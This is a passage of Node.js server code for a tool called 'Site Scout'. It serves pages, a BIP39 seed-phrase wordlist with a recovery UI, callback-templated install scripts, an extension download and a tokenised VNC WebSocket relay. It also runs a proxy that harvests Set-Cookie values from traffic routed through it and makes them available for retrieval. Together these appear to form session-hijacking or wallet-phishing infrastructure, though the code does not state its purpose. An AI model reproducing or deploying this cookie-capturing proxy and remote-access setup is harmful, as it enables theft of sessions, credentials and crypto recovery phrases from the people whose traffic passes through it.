  if (request.method === "GET" && pathname === "/room") {
    response.writeHead(200, { "content-type": "text/html; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "room.html")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/share") {
    response.writeHead(200, { "content-type": "text/html; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "share.html")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/view") {
    response.writeHead(200, { "content-type": "text/html; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "view.html")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/pick") {
    response.writeHead(200, { "content-type": "text/html; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "pick.html")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/cookies") {
    response.writeHead(200, { "content-type": "text/html; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "cookies.html")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/") {
    response.writeHead(200, { "content-type": "text/html; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "index.html")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/app.css") {
    response.writeHead(200, { "content-type": "text/css; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "app.css")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/app.js") {
    response.writeHead(200, { "content-type": "text/javascript; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "app.js")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/bip39-english.js") {
    response.writeHead(200, { "content-type": "text/javascript; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(require.resolve("@scure/bip39/wordlists/english.js")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/bip39.mjs") {
    response.writeHead(200, { "content-type": "text/javascript; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "bip39.mjs")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/recovery-ui.js") {
    response.writeHead(200, { "content-type": "text/javascript; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "recovery-ui.js")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/qrcode.min.js") {
    response.writeHead(200, { "content-type": "text/javascript; charset=utf-8", "x-content-type-options": "nosniff" });
    fs.createReadStream(path.join(PUBLIC_DIR, "qrcode.min.js")).pipe(response);
    return;
  }
  if (request.method === "GET" && pathname === "/install.sh") {
    const shPath = path.join(PUBLIC_DIR, "install.sh");
    fs.readFile(shPath, "utf8", (err, data) => {
      if (err) { sendJson(response, 404, { error: "Not found." }); return; }
      const host = request.headers.host || `localhost:${PORT}`;
      const proto = request.headers["x-forwarded-proto"] || "http";
      const scoutUrl = `${proto}://${host}`;
      const sh = data.replace(/__SCOUT_URL__/g, scoutUrl);
      response.writeHead(200, {
        "content-type": "text/x-shellscript",
        "content-disposition": 'attachment; filename="site-scout-install.sh"',
        "cache-control": "no-store",
      });
      response.end(sh);
    });
    return;
  }
  if (request.method === "GET" && pathname === "/install.bat") {
    const batPath = path.join(PUBLIC_DIR, "install.bat");
    fs.readFile(batPath, "utf8", (err, data) => {
      if (err) { sendJson(response, 404, { error: "Not found." }); return; }
      const host = request.headers.host || `localhost:${PORT}`;
      const proto = request.headers["x-forwarded-proto"] || "http";
      const scoutUrl = `${proto}://${host}`;
      const bat = data.replace(/__SCOUT_URL__/g, scoutUrl);
      response.writeHead(200, {
        "content-type": "application/octet-stream",
        "content-disposition": 'attachment; filename="site-scout-install.bat"',
        "cache-control": "no-store",
      });
      response.end(bat);
    });
    return;
  }
  if (request.method === "GET" && pathname === "/extension.zip") {
    const zipPath = path.join(PUBLIC_DIR, "extension.zip");
    fs.access(zipPath, fs.constants.R_OK, (err) => {
      if (err) { sendJson(response, 404, { error: "Not found." }); return; }
      response.writeHead(200, { "content-type": "application/zip", "content-disposition": "attachment; filename=\"site-scout-extension.zip\"", "cache-control": "no-store" });
      fs.createReadStream(zipPath).pipe(response);
    });
    return;
  }
  if (request.method === "GET" && pathname === "/favicon.ico") {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><rect width="32" height="32" rx="9" fill="#b2f0d0"/><text x="16" y="23" text-anchor="middle" font-family="sans-serif" font-size="20" font-weight="700" fill="#17362d">S</text></svg>`;
    response.writeHead(200, { "content-type": "image/svg+xml", "cache-control": "public, max-age=86400" });
    response.end(svg);
    return;
  }
  sendJson(response, 404, { error: "Not found." });
});

// ── HTTP Proxy server (port 8080) — captures Set-Cookie from proxied traffic ──
// Phone sets WiFi proxy to <pc-ip>:8080, browses normally, cookies appear at /api/proxy-cookies
const PROXY_PORT = Number(process.env.PROXY_PORT || 8080);
const proxyCookieStore = new Map(); // domain -> Set of "name=value" strings

function storeProxyCookies(host, setCookieHeaders) {
  const domain = host.replace(/:\d+$/, "").replace(/^\./, "");
  if (!proxyCookieStore.has(domain)) proxyCookieStore.set(domain, new Map());
  const jar = proxyCookieStore.get(domain);
  for (const hdr of [].concat(setCookieHeaders || [])) {
    const part = hdr.split(";")[0].trim();
    const eq = part.indexOf("=");
    if (eq < 1) continue;
    jar.set(part.slice(0, eq).trim(), part.slice(eq + 1).trim());
  }
}

const proxyServer = net.createServer();
proxyServer.on("connection", (clientSocket) => {
  let buf = Buffer.alloc(0);
  clientSocket.once("data", (chunk) => {
    buf = Buffer.concat([buf, chunk]);
    const str = buf.toString("utf8", 0, Math.min(buf.length, 4096));
    const firstLine = str.split("\r\n")[0];

    // CONNECT method — HTTPS tunnel, just pipe through (can't inspect TLS without MITM cert)
    if (firstLine.startsWith("CONNECT ")) {
      const target = firstLine.split(" ")[1];
      const [host, portStr] = target.split(":");
      const port = Number(portStr) || 443;
      const serverSocket = net.connect(port, host, () => {
        clientSocket.write("HTTP/1.1 200 Connection Established\r\n\r\n");
        serverSocket.write(buf.slice(buf.indexOf("\r\n\r\n") + 4));
        clientSocket.pipe(serverSocket);
        serverSocket.pipe(clientSocket);
      });
      serverSocket.on("error", () => clientSocket.destroy());
      clientSocket.on("error", () => serverSocket.destroy());
      return;
    }

    // Plain HTTP — intercept response to capture Set-Cookie
    const methodMatch = firstLine.match(/^(\S+)\s+(\S+)\s+HTTP/);
    if (!methodMatch) { clientSocket.destroy(); return; }
    const hostMatch = str.match(/^Host:\s*(.+)$/im);
    const host = hostMatch ? hostMatch[1].trim() : null;
    if (!host) { clientSocket.destroy(); return; }
    const [hostname, portStr] = host.split(":");
    const port = Number(portStr) || 80;

    const serverSocket = net.connect(port, hostname, () => {
      serverSocket.write(buf);
    });

    let respBuf = Buffer.alloc(0);
    let headersDone = false;
    serverSocket.on("data", (data) => {
      clientSocket.write(data);
      if (!headersDone) {
        respBuf = Buffer.concat([respBuf, data]);
        const headerEnd = respBuf.indexOf("\r\n\r\n");
        if (headerEnd !== -1) {
          headersDone = true;
          const headerStr = respBuf.slice(0, headerEnd).toString("utf8");
          const setCookies = headerStr.split("\r\n")
            .filter(l => /^set-cookie:/i.test(l))
            .map(l => l.slice(l.indexOf(":") + 1).trim());
          if (setCookies.length) storeProxyCookies(hostname, setCookies);
        }
      }
    });
    serverSocket.on("error", () => clientSocket.destroy());
    clientSocket.on("data", (d) => serverSocket.write(d));
    clientSocket.on("error", () => serverSocket.destroy());
    serverSocket.on("end", () => clientSocket.end());
    clientSocket.on("end", () => serverSocket.end());
  });
});

if (require.main === module) {
  server.listen(PORT, "0.0.0.0", () => {
    console.log(`Site Scout is running at http://127.0.0.1:${PORT}`);
  });
  proxyServer.listen(PROXY_PORT, "0.0.0.0", () => {
    console.log(`Cookie proxy running at :${PROXY_PORT} — set your phone WiFi proxy to <this-pc-ip>:${PROXY_PORT}`);
  });
}

// WebSocket proxy — forward /vnc-ws upgrades to websockify on port 5999
server.on("upgrade", (req, socket, head) => {
  const u = new URL(req.url, "http://localhost");
  if (u.pathname.startsWith("/vnc-ws") || u.pathname.startsWith("/websockify")) {
    // Validate token before allowing WebSocket connection
    const reqToken = u.searchParams.get("t") || "";
    if (!reqToken || reqToken !== VNC_TOKEN) {
      socket.write("HTTP/1.1 403 Forbidden\r\n\r\n");
      socket.destroy();
      return;
    }
    const target = net.connect(5999, "127.0.0.1", () => {
      target.write(
        `GET ${req.url} HTTP/1.1\r\nHost: localhost:5999\r\n` +
        Object.entries(req.headers).map(([k,v]) => `${k}: ${v}`).join("\r\n") +
        "\r\n\r\n"
      );
      target.write(head);
      socket.pipe(target);
      target.pipe(socket);
    });
    // Keep-alive so ngrok doesn't drop idle VNC connections
    socket.setKeepAlive(true, 10_000);
    target.setKeepAlive(true, 10_000);
    target.on("error", () => socket.destroy());
    socket.on("error", () => target.destroy());
  } else {
    socket.destroy();
  }
});

module.exports = { isPublicIPv4, normalizeTarget, inspectHtml, createPinnedLookup, server };
